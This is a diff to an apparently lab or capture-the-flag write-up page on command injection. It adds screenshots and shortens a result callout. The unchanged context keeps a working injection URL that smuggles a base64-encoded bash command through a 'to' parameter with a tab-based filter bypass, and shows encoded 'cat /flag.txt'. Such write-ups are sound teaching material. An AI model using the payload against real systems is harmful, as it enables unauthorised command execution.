@@ -368,10 +368,11 @@ d2hvYW1p</code></pre>
 
     <div class="code-label">Whoami via HTTP</div>
     <pre class="url"><code>http://154.57.164.73:31564/index.php?to=%3Bbash%3C%3C%3C$(base64%09-d%3C%3C%3Cd2hvYW1p)&amp;from=51459716.txt&amp;finish=1&amp;move=1</code></pre>
-
+    <img src="/assets/img/1_xhEc1_SucvR4sdL5wHTL9w.png" alt="Command output reflected in error message" style="width:100%; border-radius:4px; border:1px solid #252830;">
+  
     <div class="callout">
       <strong>Result</strong>
-      The output of <code>whoami</code> is reflected in the "Malicious request denied!" error message on the page, confirming code execution.
+      The output of <code>whoami</code> is reflected in the error message on the page.
     </div>
 
     <!-- FLAG -->
@@ -395,7 +396,7 @@ Y2F0IC9mbGFnLnR4dA==</code></pre>
       The flag is reflected in the error message. Assessment complete.
     </div>
 
-    <div class="img-placeholder">[ Screenshot: flag reflected in error message ]</div>
+    <img src="/assets/img/1_SLqu9187nk5X2qoB0RBwSA.png" alt="Flag reflected in error message" style="width:100%; border-radius:4px; border:1px solid #252830;">
 
   </div>
 </main>
